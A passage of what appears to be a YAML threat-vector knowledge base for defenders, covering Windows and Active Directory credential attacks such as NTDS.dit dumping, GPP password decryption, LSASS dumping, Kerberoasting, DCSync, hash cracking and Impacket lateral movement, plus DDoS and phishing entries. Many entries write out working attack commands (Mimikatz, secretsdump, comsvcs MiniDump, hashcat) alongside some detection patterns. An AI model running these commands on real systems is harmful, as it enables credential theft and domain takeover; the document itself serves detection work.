    description: 'A threat actor in control of the prerequisites may attempt to use
      the Azure CLI to perform changes either to the endpoint from which the CLI is  accessed
      or on remote infrastructure, user accounts, service principals,  or configurations.   A
      threat actor can only perform changes that are allowed in the scopes of credentials,
      temporary credentials, or service principals that the threat  actor has control
      of, barring usage of a vulnerability in Azure to allow more than that. '
    criticality: Baseline - Negligible
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0107%5D-Changes-to-Azure-infrastructure-deployed-through-Azure-CLI
  - id: TVM0108
    name: Named pipe creation using a predictable naming convention
    description: 'A threat actor may deploy named pipes are part of an automation
      process to achieve a goal. As example, this could be the Cobalt Strike keylogger
      deployment, where the cobalt Strike operator merely clicks a button in the UI
      to deploy the keylogger, and behind the scenes  this runs an automation on the
      compromised endpoint, which includes the creation of a named  pipe, which in
      this case will have a predictable name, unless the CS operator changes this  during
      the deployment (manual config in CS possible to deploy with custom named pipe
      name) '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0108%5D-Named-pipe-creation-using-a-predictable-naming-convention
  - id: TVM0109
    name: Credential dumping using an extracted NTDS.dit file from Active Directory
    description: 'NTDS.dit is the main AD database file and stands for New Technologies
      Directory Services and DIT stands for Directory Information Tree. By default
      this file is located in “%SystemRoot%\NTDS\Ntds.dit” directory.  NTDS.dit file
      contains the following four partitions:  1. Schema partition 2. Configuration
      partition 3. Domain partition 4. Application partition  - Schema partition contains
      information about objects along with their attributes and their relation to
      one another. - Configuration partition has all the forest and trees which replicates
      itself to all of the domain controllers. - Domain partition consists of all
      the information related to the domain. - Application partition contains all
      the details related to any application.  All of the information in the four
      partitions is a part of NTDS.dit file.  There exist multiple different ways
      for extracting user''s credentials from NTDS.dit file. For example, with automation
      tools like: FGDump or PowerShell scripts.  FGDump tool is performing a local
      dump of the NTDS (it can dump password and the user''s cache successfully).
      This tool creates a file with an extension PWDump. The tool is dumping hashes
      into this file from the target system.  Example:  fgdump.exe type <pwdump file
      name>  The threat actors may use another way for automated dumping of hashes
      from NTDS with Powershell with NTDSUtil utility (ntdsutil.exe). When an instance
      in Powershell is launched, NTDSutil.exe utility runs with additional parameters
      in the location C:\ drive and asks NTDSUtil to use its ability to tap into the
      Active Directory Database and fetch the SYSTEM and SECURITY hive files as well
      as the ntds.dit file.  Example:  powershell "ntdsutil.exe ''ac i ntds'' ''ifm''
      ''create full c:\temp'' q q"  The user''s password hashes can be extracted from
      SYSTEM and SECURITY hive files with a script, for example secretsdump.py script.  ./secretsdump.py
      -ntds /root/ntds.dit -system /root/SYSTEM LOCAL  Tools used for enumeration
      of NTDS file and the content of Active Directory hashes:   - Volume Shadow Copy  -
      secretsdump.py  - Using the in-built Windows tool, ntdsutil.exe  - Invoke-NinjaCopy  -
      Metasploit  - FGDump (tool for for mass password auditing)  - PowerShell script
      (example NTDSutil.exe)    With NTDSutil.exe in combination with custom parameters
      in PowerShell script     the hive files from NTDS can be extracted in a temporary
      directory  - DSInternals (framework for performing AD Security Audits)  - NTDSDump.exe
      (external tool)     Download link: https://github.com/zcgonvh/NTDSDumpEx/releases '
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0109%5D-Credential-dumping-using-an-extracted-NTDS.dit-file-from-Active-Directory
  - id: TVM0110
    name: Volumetric Distributed denial of service (DDoS) attack
    description: 'Threat actors may wish to cause business disruption, media/public
      attention, or to use the pretense of business disruption to disguise other activities.  Any
      DDoS attack should always be followed up with other DFIR activities to  determine
      if the attack was meant to distract from something else. DDoS can  distract
      by pulling attention away, or even by spooling out log files so  that relevant
      entries are overwritten. '
    criticality: Emergency
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0110%5D-Volumetric-Distributed-denial-of-service-%28DDoS%29-attack
  - id: TVM0111
    name: Manipulation of credentials stored in GPP XML files
    description: "Group Policy Preferences (GPP) are tools that allow administrators\
      \ to create domain policies with embedded credentials. These policies allow\
      \ administrators to alter their administrative settings and configuration. \
      \ Group Policy template is a collection of files and folders stored on the system\
      \ volume (SYSVOL). The file Groups.xml contains password files and is stored\
      \ on the location: \\\\IP-Address-of-the-DC\\sysvol\\NAME\\Policies Any domain\
      \ user can access this directory and decrypt the AES-256 bit encrypted passwords\
      \ on this location (the AES private key may leak online. SYSVOL is the domain-extensive\
      \ share folder in the Active Directory accessed by all authenticated users.)\
      \  Group.xml file contains two important sections:   -\tuserName  -\tcpassword\
      \  Example:   userName=”Administrator” cpassword=”DemoHashab+5T4cr1H4gFZvD9OWzDEMO23ab5abpL6D124″\
      \  For protection Microsoft encrypts the password using AES before it is stored\
      \ as “cpassword”. But the keys are available publically on MSDN. (Microsoft\
      \ Developer Network)  The cpassword stored in XML file looks like: └─$ cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml\
      \  ...  D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"\
      2018-07-18 20:46:06\"   uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"><Properties\
      \ action=\"U\" newName=\"\" fullName=\"\"   description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\"\
      \   changeLogon=\"0\" noChange=\"1\"   ...  When a new GPP is created for the\
      \ user or group account, it will be interrelated with a Group.XML file created\
      \ in SYSVOL with the relevant configuration information and the password is\
      \ AES-256 bit encrypted. Therefore the password is not secure at all authenticated\
      \ users have access to SYSVOL.  Threat actors collect the Group.XML files and\
      \ manage to decrypt them with automated tools like: Metaspoit, Powershell commands\
      \ or python scripts.   - Metasploit's post exploitation module: \"post/windows/gather/credentials/gpp\"\
      \ - Get-GPPPassword (for collecting of password files) - gpprefdecrypt.py  On\
      \ the SYSVOL share, dir /s *.xml can be used to enumerate potential XML files.\
      \  Example for Metaspoit-I lookup of Group Policy Preference (GPP) XML files,\
      \ containing local/domain user accounts and passwords and decryption with AES\
      \ key:  use auxiliary/scanner/smb/smb_enum_gpp msf auxiliary(smb_enum_gpp) >\
      \ set rhosts 192.168.1.103 msf auxiliary(smb_enum_gpp) > set smbuser raj msf\
      \ auxiliary(smb_enum_gpp) > set smbpass Ignite@123 msf auxiliary(smb_enum_gpp)\
      \ > exploit  Cached Group Policy files may be found on end-user devices. The\
      \ Metaspoit script is checking usually locations like:  C:\\ProgramData\\Microsoft\\\
      Group Policy\\History\\{ EE416E94-7362-4587-9CEC-651656DB7538}\\Machine\\Preferences\\\
      Groups\\Groups.xml C:\\Windows\\SYSVOL\\sysvol\\Pentest.Local\\Policies\\{ EE416E94-7362-4587-9CEC-651656DB7538}\\\
      Machine\\Preferences\\Groups\\Groups.xml  When threat actors collect user hashes\
      \ they can decrypt them with automated tools, for example gpp-decrypt.  apt\
      \ install gpp-decrypt gpp-decrypt  When the threat actor receives the password\
      \ in clear text, for example a password of an account with higher privileges\
      \ like Administrator or a user in Administrator’s group they can abuse the permissions\
      \ and can alter the administrative configurations. For example, they may enable\
      \ an administrative setting that allows more actions on a desktop or server\
      \ system.  "
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0111%5D-Manipulation-of-credentials-stored-in-GPP-XML-files
  - id: TVM0112
    name: Using a Windows command prompt for credential manipulation
    description: 'Threat actors may use Windows commad prompt commands to search for,
      access in order to manipulate (create, modify, delete, read) user''s credentials
      locally or in a domain. For example, they can extract user''s passwords from
      Credential Manager. Windows Credential Manager is a store with all user''s saved
      passwords automatically during user daily work. It provides an interface from
      where the credentials can be managed. To access Credential Manager, the threat
      actor needs to elevate his previleges to administrator and run the command promt
      console with "Run as administrator".  Cmdkey.exe is a command-prompt utility
      which can create, list, and delete stored user names and passwords or credentials.
      It''s usually located in the  %SYSTEM% sub-folder and its usual size is around
      13,850 bytes.  Example for try to gain user''s details with cmdkey from Windows
      Credential Manager:  cmdkey /list:testTarget  The command returns the Target(testTarget),
      Type(Domain Password), and the Username(testUser).  A threat actor can also
      manipulate the Credential Manager database, for example to add, modify or delete
      credentials from manager sections. It is possible to add an Internet or network
      address, user name, password and others.  Example for adding of entry in Credential
      Manager. With the command below a threat actor can add username-password key
      pair for access to specific system.  cmdkey /add:computer-name /user:user-name
      /pass:your-password  Example for deletion of entry in Credential Manager. A
      threat actor fist execute list command to see all potential targets and select
      an entry for deletion.  cmdkey /list cmdkey /delete:target-name  Another approach
      to search and retrieve user''s credentials with command promt is for example
      with net utility. Net utility executed via the network  is used to query for
      user''s password. The passwords can be storred on shared network drives or locally.  Example:  net
      use \\unc\path /user:username password  or   net use \\%userdnsdomain% /user:%userdomain%\%username%
      *  The asterisk at the end forces to ask for password.  With net utility a threat
      actor can also modify already existing user name or password or to delete the
      existing credentials entry.   Examples:   net user <username> * <type a new
      password> <retype the new password to confirm>  The command below will set the
      password to blank: net user username ""   The following command will remove
      the password for the user with the specified userneme:  net user <username>
      /passwordreq:no '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0112%5D-Using-a-Windows-command-prompt-for-credential-manipulation
  - id: TVM0113
    name: PowerShell usage for credential manipulation
    description: 'Threat actors are using different methods to manipulate user''s
      credentials. One example of credential manipulation is by using PowerShell commands
      or scripts. For example, PowerShell cmdlets or custom section of script can
      be used to gather credentials from Windows Credential Manager or other credentials
      stores in the system.  Example for access Windows Credential Manager credentials
      with PowerShell:  Install-Module CredentialManager -force New-StoredCredential
      -Target $url -Username $ENV:Username -Pass <parameter> Get-StoredCredential
      -Target <target>  Or threat actors can use ready PowerShell module for Credential
      Manager:  PS> Save-Module -Name CredentialManager -Path PS> Install-Module -Name
      CredentialManager -RequiredVersion <the_version>  Example for Get-Credential
      cmdlet. This is a PS command which prompts a user for his username and password,
      and then stores those credentials in a $Cred variable. The stored credentials
      are then passed to the Get-WmiObject cmdlet as the -Credential parameter, allowing
      the script to connect to the specified remote computer using those credentials.  Example:   $Cred
      = Get-Credential Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer
      -Credential $Cred  With a Credential parameter threat actors can pass the $credential
      variable to other different commands.  Example:  PS> $credential.UserName root  GetNetworkCredential()
      method is used to obtain the user''s passwords. A threat actor can append a
      "Password" property in the end of GetNetworkCredential() method to display the
      passwords in cleartext.  Example:  PS> $credential.GetNetworkCredential()  UserName
      Domain -------- ------ root  PS51> $credential.GetNetworkCredential().Password
      <password_in_clear_text> '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0113%5D-PowerShell-usage-for-credential-manipulation
  - id: TVM0114
    name: Credential manipulation of domain accounts with SPNs
    description: 'A service principal name (SPN) is a unique indentifier of a service
      instance which associates each service instance with a service logon account.
      This allows a client application to authenticate in the Domain Controller and
      request a service even if the client does not have the account name.  Service
      Principle Name (SPN) are identifiers related to service accounts with elevated
      privileges in the domain. These service accounts may automatically perform an
      authentication to the Domain Controller because the session token (the Ticket-Granting-Ticket
      is active) is already established.  The main goal of the threat actors is to
      collect SPN account user hashes. Once obtained the threat actor will be able
      to authenticate as the SPN account.  To execute this threat vector a threat
      actor needs only the following requirements:  1. The user account on the domain
      (can gain this account through social engineering, network poisoning attacks,
      or various exploits.)  2. A tool or commands to query the SPN user accounts
      and obtain their hashes. (Examples for such tools are: Rubeus, Impacket Toolkit,
      Invoke-Kerberoast PowerShell module or Mimikatz). All of these tools are freely
      available online and the threat actors can use them easily and directly from
      Internet.  3. The threat actor needs the ability to crack the SPN’s password
      hash.  (This depends on the strength of the password in use, the capabilities
      of the attacker and the used tools for decryption)  Kerberoasting attacks are
      possible because of vulnerability in the architecture  of Kerberos and another
      reliable element: insecure user behavior.  Example for extraction of TGT tickets
      acquired from the ram with Mimikatz tool:  mimikatz # kerberos::list /export  Example
      how to request a service ticket for a service account SPN with PowerShell:  Add-Type
      –AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
      –ArgumentList ’<sql_instance_name>.local:<port>’  Some Kerberoasting tools like:
      kerberoast can crack tickets and provide their cleartext passwords by running
      a dictionary of password hashes against them. Kerberoast is a python script.  Example
      of Kerberoast python script:  ./<python_script_name>.py wordlist.txt <sql_instance_name>.local.test  OR   Python
      <python_script_name>.py wordlist.txt <sql_instance_name>.local.test '
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0114%5D-Credential-manipulation-of-domain-accounts-with-SPNs
  - id: TVM0115
    name: Script execution on Windows for credential manipulation
    description: 'One example of script execution for credential manipulation is the
      use of a Python or other type of script to access and read/change a user''s
      credentials stored in a file, such as Windows Credential Manager.  The script
      could be designed to read the file, decrypt the stored credentials, make changes
      to the username or password, and then save the updated information back to the
      file. Threat actors are using also different cmd utilities in combination with
      script commands to gain or modify user''s credentials. For example, such utilities
      can be cmdkey, keyring libraries and others.  Example for a script that can
      manipulate a credentials file:  import os import json import base64  # Function
      to encrypt the credentials def encrypt_credentials(credentials): encoded_credentials
      = base64.b64encode(json.dumps(credentials).encode()) return encoded_credentials.decode()  #
      Function to decrypt the credentials def decrypt_credentials(encoded_credentials):
      decoded_credentials = json.loads(base64.b64decode(encoded_credentials).decode())
      return decoded_credentials  # Function to update the credentials def update_credentials(username,
      password): # Reading the credentials from file with open("credentials.txt",
      "r") as file:     encoded_credentials = file.read() # Decrypting the credentials
      credentials = decrypt_credentials(encoded_credentials) # Updating the username
      and password credentials["username"] = username credentials["password"] = password
      # Encrypting the updated credentials encoded_credentials = encrypt_credentials(credentials)
      # Saving the updated credentials to file with open("credentials.txt", "w") as
      file:     file.write(encoded_credentials)  # Function call to update the credentials
      update_credentials("new_username", "new_password")  Example for python code
      which extracts user''s credentials with cmdkey utility:  import os  os.system(''cmdkey
      /add:TERMSRV/X.X.X.X/user:Administrator /pass:<password>'') os.system(''mstsc
      /v:X.X.X.X'') os.system(''cmdkey /delete:TERMSRV/X.X.X.X'')  Example for keyring
      library python script for credential manipulation. Keyring libraries are used
      to manage the credentials. In the script threat  actors are using different
      functions like: set_credentials(), get_credentials() and update_credentials()
      to set, retrieve or change username and password for the specific user or service.
      Keyring library uses the operating system''s secure storage to store the credentials.  This
      secure storage provides credential encryption and the passwords are not stored
      in plain text.  import keyring  # Function to set the credentials def set_credentials(username,
      password): keyring.set_password("service_name", username, password)  # Function
      to get the credentials def get_credentials(): username = input("Enter your username:
      ") password = keyring.get_password("service_name", username) return username,
      password  Some credential stealers, for example Ryuk and TrickBot are based
      on custom scripts. For example, TrickBot is configured to use network propagation
      script modules (sharedll and tabdll) that rely on SMB and can harvest credentials
      and propagate to additional systems in the network. '
    criticality: Medium
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0115%5D-Script-execution-on-Windows-for-credential-manipulation
  - id: TVM0116
    name: Credential manipulation on local Windows endpoint
    description: 'Credential manipulation on a local Windows endpoint refers to an
      act of modifying, altering, or stealing sensitive information such as usernames,
      passwords, and other authentication data.  An example of credential manipulation
      could be the usage of a tool, for example like Mimikatz to extract login credentials
      from memory or to manipulate and modify existing credentials stored on the local
      system. The threat actor could use these manipulated credentials to gain unauthorized
      access to other systems or network resources.  The threat actors abuse and some
      legitimate administrator tools, such as the Microsoft Sysinternals tool: ProcDump
      or Task Manager to dump lsass.exe process memory and to collect credentials.
      This approach is common and known as "living-off-the-land", which means usage
      of legit native Windows tools in order to avoid possible detection.  Threat
      actors can gather, modify or delete credentials on the local Windows system
      also by using Windows Explorer manually or with scrips to access local files
      that may store user''s or system credentials. For example Keepass or other local
      databases which contain passwords.  Examples:   Threat actors are using Mimikatz
      LSADUMP Module to collect SAM registry hashes.   lsadump::sam  Or to extract
      credentials from LSASS Dump files.  Mimikatz module lsass.exe dumps credentials
      in a more stealthy mode. The lsass.exe process manages many user credential
      secrets and can be associated with credential theft behavior.  sekurlsa::minidump
      lsass.dmp log lsass.txt sekurlsa::logonPasswords  For extracting of Domain Controller
      cached credentials is used LSADUMP module: lsadump::cache  Locally, the threat
      actors can run sekurlsa Mimikatz module to obtain logon credentials:  sekurlsa::Minidump
      lsassdump.dmp sekurlsa::logonPasswords  Built-in Windows tools such as comsvcs.dll
      can also be used:  rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID
      lsass.dmp full  There are variety of different tools that the threat actors
      use for memory dump, for example:  - Taskmgr.exe - ProcDump - ProcessExplorer.exe
      - Process Hacker - SQLDumper - PowerSploit – Out-MiniDump - VM Memory Dump Files
      - Hibernation Files '
    criticality: Medium
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0116%5D-Credential-manipulation-on-local-Windows-endpoint
  - id: TVM0117
    name: Protocol based DDoS attack
    description: Threat actors may wish to cause business disruption, media/public
      attention, or to use the pretense of business disruption to disguise other activities.
      Any DDoS attack should always be followed up with other DFIR activities to determine
      if the attack was meant to distract from something else. DDoS can distract by
      pulling attention away, or even by spooling out log files so that relevant entries
      are overwritten.
    criticality: Emergency
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0117%5D-Protocol-based-DDoS-attack
  - id: TVM0118
    name: Manipulation of credentials stored in plain text files
    description: 'Threat actors are searching for credentials stored in plain text,
      usually in an application''s properties, configuration files, system memory
      or other places in the system. Storing a plain text password could lead to data
      leakage because, for example when the passwords are stored in clear text in
      a configuration file everyone who has read access to the file can see and steal
      the passwords. In most cases, even storage of a plaintext password in a memory
      is considered as a security risk if the password is not cleared immediately
      after it is used. Good password management policies require that a password
      shouldn''t be stored in a plaintext.  In some cases the user''s passwords are
      stored in plain text when a program application or system file crates and saves
      them automatically in a file without encryption. In other cases the credentials
      can be stored in clear  text by user''s mistake. Threat actors are using different
      methods like: password cracking, dictionary attack, social engineering and phishing
      attacks, man in the middle attack, malware injections and others to steal and
      manipulate credentials stored in a plain text.  One example of manipulation
      of credentials stored in plain text files is by using a technique called "password
      cracking." This involves using a computer program to repeatedly guess a password
      or its hash until the correct one is found. If the plain text file containing
      the credentials is not properly secured, an attacker could gain access to sensitive
      information such as username and password combinations. Threat actors are using
      variety of different tools to crack user''s credentials, for example: John the
      Ripper, Hashcat, Aircrack-ng, Cain and Abel, Mimikatz, custom python scripts
      and others.   Example for a code that reads a password from a properties file
      and uses the password to connect to a database:  Properties prop = new Properties();
      prop.load(new FileInputStream("config.properties")); String password = prop.getProperty("password");  DriverManager.getConnection(url,
      usr, password);  Example for a python script scanning for files stored in a
      clear text:  # put your path here  # Network SMB path you want to search  root_dir
      = ("xxxxxx", "etc.") # location where you want to put the result  stored_dir
      = ''xxxxxxxxx'' # exception you want to filter exception_path = ["snapshot"] '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0118%5D-Manipulation-of-credentials-stored-in-plain-text-files
  - id: TVM0119
    name: Manipulation of credentials stored in LSASS
    description: 'Credentials can be stored in the Local Security Authority Subsystem
      Service (LSASS) process in memory for use by the account. LSASS stores credentials
      in memory on behalf of users with active Windows sessions. LSASS can store user
      or system credentials in several different ways:  Reversibly encrypted plaintext,
      Kerberos Tickets, NT hashes or LM hashes.   The threat actors can harvest these
      credentials with an administrative user or SYSTEM. Administrative accounts are
      used by users to carry out tasks that require special permissions, such as installing
      software or renaming a computer and they need higher administrative privileges.
      In the most cases the threat actors are using different tools to manipulate
      the credentials in LSASS process in memory, for example: Mimikatz, Cobalt Strike,
      Impacket, Metasploit, PowerSploit, Empire, Pwdump, Dumpert and others.  Mimikatz
      is a tool that allows an attacker to extract clear text passwords, hash values,
      and Kerberos tickets from LSASS. The tool can be used to retrieve password information
      for a user account that is currently logged into a system, or to extract the
      hashes of all user accounts on a system, which can then be used to perform offline
      password cracking.  By manipulating LSASS, an attacker can gain access to sensitive
      information, such as passwords and other credentials, and use that information
      to compromise the security of a system or network.  For example, on thetarget
      host threat actors can use procdump:  procdump -ma lsass.exe lsass_dump  Example
      for a local credential dumping from LSASS memory with Mimikatz sekurlsa:  sekurlsa::Minidump
      lsassdump.dmp sekurlsa::logonPasswords  Example for process dumping memory of
      lsass.exe to obtain credentials. Threat actors are using dynamic-link libraries
      (DLLs) like Rundll32 to manipulate the process in LSASS memory.  rundll32 C:\windows\system32\comsvcs.dll
      MiniDump lsass.dmp  OR  process == rundll32.exe && command_line_includes (''MiniDump'')  Example
      for a process that access LSASS memory:  process == (''powershell.exe'' || ''taskmgr.exe''
      || ''rundll32.exe'' || ''procdump.exe''  || ''procexp.exe'' || [other native
      processes that don’t normally access LSASS]) && cross_process_handle_to (''lsass.exe'')  Threat
      actors can use PowerShell scripts to request process access to lsass.exe process
      (an example for access to PROCESS_ALL_ACCESS – 0x1F0FFF process):  $Handle =
      [Uri].Assembly.GetType(''Microsoft.Win32.NativeMethods'')::OpenProcess(0x1F0FFF,
      $False, (Get-Process lsass).Id)  If the key value pair in the registry for LSASS
      is changed to 1, this is an indicator that the passwords are stored in cleartext
      in LSASS memory.  Example for a DWORD in the registry:   HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/SecurityProviders/WDigest/UseLogonCredentia '
    criticality: Medium
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0119%5D-Manipulation-of-credentials-stored-in-LSASS
  - id: TVM0120
    name: Password hash cracking on Windows
    description: 'Threat actors often extract valid credentials from target systems.
      When these credentials are in a hashed format, threat actors may use different
      methods to crack and obtain the credentials in clear text. When this information
      cannot be directly leveraged for higher privileges (like with pass-the-hash,
      overpass-the-hash), it is required to crack it. Some methods that threat actors
      use include: brute force, dictionary attack, or sub-set of the dictionary attack
      named rainbow tables. Threat actors can use a variety of tools to crack password
      hashes. For example, Mimikatz, Hashcat, CrackStation, Password Cracker, Brutus
      Password Cracker, Aircrack, THC Hydra, RainbowCrack, Cain and Abel, Medusa,
      John The Ripper, ophCrack, WFuzz, L0phtCrack, OphCrack and others.  The threat
      actors can crack the password hashes, for example with JTR or Hashcat cracking
      tools that use text files to match and crack the hashes.  (an example for a
      text file could be: rockyou.txt)  gunzip /usr/share/wordlist/file.txt john hash.txt
      /usr/share/wordlists/file.txt — format=nt  hashcat -m 1000 hash.txt /usr/share/wordlists/file.txt  An
      example of how to use Hashcat for a dictionary attack:  hashcat --attack-mode
      0 --hash-type $number $hashes_file $wordlist_file  OR   hashcat --loopback --attack-mode
      0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file  Example
      for Hashcat tool which can bruteforce any password from 4 to 8 characters long:  hashcat
      --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type
      $number $hashes_file "file"  Hashcat can also be started with custom charsets:  hashcat
      --attack-mode 3 --custom-charset1 "?u" --custom-charset2 "?l?u?d" --custom-charset3
      "?d" --hash-type $number $hashes_file "file" '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0120%5D-Password-hash-cracking-on-Windows
  - id: TVM0121
    name: Credential manipulation on remote Windows endpoint
    description: 'Threat actors can perform credential manipulation on a remote Windows
      endpoint with a variety of tools like: Mimikatz, WMIExec, WinRM-based, PsExec,
      SMBExec or PowerShell or others to extract credentials from a credential storage
      point on the endpoint, as example from the endpoint''s memory. This can be done
      by an attacker who already has gained access to and control of one endpoint.  Requirements:  -
      permissions to access the remote machine - permission/ability to run credential
      dumping tools - or an ability to start a service remotely  Impacket PsExec example
      with username and password:  python3 psexec.py <domain>/<user>:<pass>@<target_host>  or
      an option with NTLM hashes  python3 psexec.py -hashes <lmhash>:<ntlmhash> <domain>/<user>@<target_host>  Example
      for Impacket SMBExec with plaintext credentials and NTLM hashes:  python3 smbexec.py
      "<domain>/<user>:<password>"@<target_host>  python3 smbexec.py -hashes <lmhash>:<ntlmhash>
      <domain>/<user>@<target_host>  Impacket suite contains a python script and can
      read the content of the registry keys and decrypt the LSA Secrets passwords.  Example:  impacket-secretdump
      -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save
      LOCAL '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0121%5D-Credential-manipulation-on-remote-Windows-endpoint
  - id: TVM0122
    name: Windows credential dumping using DCSync
    description: 'The DCSync attack is a well-known credential dumping technique that
      enables threat actors to obtain sensitive information from the AD database.
      The DCSync attack allows attackers to reproduce the Domain Controller (DC) replication
      process and pretend to be a DC and request a DCsync operation from another DC.
      This technique results in the pulling of credential data to an attacker controlled
      machine. The extracted data can contain current and historical hashes of potentially
      useful accounts such as KRBTGT and Administrators. The hashes can then in turn
      be used to create a Golden Ticket for use in Pass the Ticket to obtain an account''s
      password. DCSync functionality is included in the "lsadump" module in Mimikatz.
      Lsadump also includes NetSync, which performs DCSync over a legacy replication
      protocol.  Threat actors abuse the native domain replication function MS-DRSR  Directory
      Replication Service (DRS) Remote Protocol and can dump user''s hashes by using
      Mimikatz, PowerShell Empire, Metaspoit or other similar tools.  Directory Replication
      Service (DRS) Remote Protocol is an RPC (Remote Procedure Call) protocol for
      replication between domain controllers and management of Active Directory. This
      method for replication requires  two interfaces: drsuapi and dsaop. These interfaces
      are located on the DC (Domain Controller) server.  When threat actors want to
      retrieve a password hash from a DC, they send an RPC request to call the interface
      and operation (drsuapi:DRSGetNSChanges) on the DC server. The action of calling
      the interface and operation runs the procedure.  After acquiring the necessary
      privileges, a threat actor may run lsadump::dcsync command in Mimikatz automation
      tool for credential manipulation.  Example:   run mimikatz''s @lsadump::dcsync
      command run mimikatz''s sekurlsa::tickets /export command  run mimikatz''s lsadump::dcsync
      /user:domain\krbtgt /domain:test.organisation.org command run mimikatz''s lsadump::dcsync
      /user:domain\test2 /domain:test.organisation.org command  The query below asks
      for the KRBTGT (Kerberos Ticket Granting Ticket) credentail account. KRBTGT
      is an account used by the default Microsoft Kerberos protocol. As a result this
      command will retrieve the KRBTGT NTLM hashes and they can be used further to
      conduct so called "GOLDEN Ticket attack". Golden Ticket attack is a technique
      of impersonating users on an AD domain by abusing Kerberos native authentication.   lsadump::dcsync
      /domain:<domain> /user:krbtgt  Example for automated hash dump using PowerShell
      Empire:  usemodule credentials/mimikatz/dcsync_hashdump set user krbtgt execute  An
      Empire module that retrieves the hash of the entire domain controller users
      account.  usemodule credentials/mimikatz/dcsync_hashdump execute  Example for
      dumping of hashes with Metaspoit:  dcsync_ntlm krbtgt dcsync krbtgt '
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0122%5D-Windows-credential-dumping-using-DCSync
  - id: TVM0123
    name: Abnormal Windows service creation attempt
    description: 'A threat actor may attempt to create Windows services in order to
      start and run software or scripts that allow the threat actor to perform actions
      that controlling a Windows service allows to perform.   This may include: Establishing
      persistence, runnning cryptominers,  communicating with command&control, launching
      remote actions or moving  laterally.  Persistence using Windows service creation
      may be achieved in many ways,  see TVMs chained from this one.   Threat actors
      may try to evade detection by using well-known service names  or names that
      very closely resemble something that would look legit on a  Windows platform.
      For example  "WinHTTP Web Proxy Auto-Discovery" or  "TCP/IP NetBIOS Help" [CRN-01]  '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0123%5D-Abnormal-Windows-service-creation-attempt
  - id: TVM0124
    name: Deletion of canary tokens in cloud storage
    description: 'A threat actor may accidentally delete a canary token in cloud storage,
      or  may purposely delete it to avoid triggering it. '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0124%5D-Deletion-of-canary-tokens-in-cloud-storage
  - id: TVM0125
    name: NTLM credentials dumping via SMB connection
    description: ' ### Attack vector related to Outlook vulnerability CVE-2023-23397  **key
      point: no user interaction**    An attacker sends an email message with an extended
      MAPI property with a  UNC path pointing to an SMB network share on a threat
      actor-controlled  server.    When a vulnerable Microsoft Outlook client (CVE-2023-23397)  receives
      in the inbox, it processes that email.    Without any user interaction, a connection
      to the remote SMB server is  established and the user’s NTLM negotiation message
      are passed in the  hearders.    The attacker can capture this message tp replay
      for authentication  against other systems that support NTLM authentication.    The
      attacker may also try to crack the original password if not too  complex.    The
      outbound NTLM negotiation message is passed with SMB and WebDav  protocols (see
      Didier Steven''s blog).  ### Attack vector using a link a user will be enticed
      to click on  **key point: the user needs to click on the link**    This attack
      is a subset of attackers objectives when using spear  phishing emails with a
      link in message body or in an attachment. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0125%5D-NTLM-credentials-dumping-via-SMB-connection
  - id: TVM0126
    name: Spearphishing Link
    description: 'Adversaries may send spearphishing emails with a malicious link
      in an attempt to gain access to victim systems. This sub-technique employs the
      use of links to download malware, instead of attaching malicious files to the
